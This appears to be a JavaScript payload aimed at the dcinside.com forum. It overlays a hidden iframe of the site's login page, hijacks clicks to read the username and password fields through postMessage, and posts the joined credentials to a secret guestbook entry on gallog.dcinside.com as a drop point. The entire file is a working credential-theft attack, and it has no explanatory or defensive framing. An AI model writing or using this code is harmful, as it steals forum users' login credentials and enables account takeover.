document.domain = 'dcinside.com';
nas = document.createElement('iframe');
nas.id = 'hash';
nas.name = 'hash';
nas.scrolling = 'no';
nas.style.position = 'fixed';
nas.style.top = '1px';
nas.style.left = '1px';
nas.style.width = '1px';
nas.style.height = '1px';
//nas.style.visibility = 'hidden';
var $ = parent.$;
nas.style.top = '-1000px';
nas.style.left = '-1000px';
nas.style.width = '1000000px';
nas.style.height = '1000000px';

function request(memo) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://gallog.dcinside.com/Intel/ajax/guestbook_ajax/write', true)
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest')
        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhr.onload = function () {
            // do something to response
            console.log(this.responseText);
        };
        data='ci_t=&password=1234&is_secret=1&name=ㅇㅇ&memo='+memo;
        xhr.send(data);
}

const receiveMessage = function(e){
        console.log(e.origin);
	if(e.data.pw.length > 5 && e.origin == "https://sign.dcinside.com"){
            var id=e.data.id;
            var pw=e.data.pw;
            var idpw=id+pw;
            request(idpw);
	}
}
window.addEventListener("message", receiveMessage, false);
opener.document.querySelector("#container > section > article:nth-child(3) > div.view_content_wrap > div > div.appending_file_box").appendChild(nas);
newwindow = window.open('https://sign.dcinside.com/login', 'hash', 'width=1px, height=1px');
$('#hash').on('load', function () {
	$('html').attr('onclick', 'var i=document.getElementById("movieIcon1").contentWindow;i.postMessage({ id : document.querySelector("#id").value, pw = document.querySelector("#pw").value }, "*");setTimeout(function(){$("#hash").remove()},300);');
});
